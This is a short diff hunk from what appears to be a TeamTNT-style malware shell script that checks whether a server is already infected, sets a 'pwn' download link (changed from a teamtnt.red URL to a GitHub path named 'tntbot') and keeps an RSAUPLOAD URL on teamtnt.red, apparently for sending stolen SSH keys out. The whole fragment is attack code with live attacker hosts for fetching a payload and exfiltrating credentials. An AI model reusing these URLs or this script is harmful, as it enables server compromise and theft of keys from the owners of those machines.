@@ -12,7 +12,7 @@ echo "replay .. i know this server ..."
 exit
 fi
 
-PWNWITHTHISLINK="https://teamtnt.red/sh/ssh"
+PWNWITHTHISLINK="https://github.com/nandakrr/TNTbotinger/blob/main/tntbot"
 RSAUPLOAD="https://teamtnt.red/only_for_stats/index.php"
 
 function setupmyapps(){
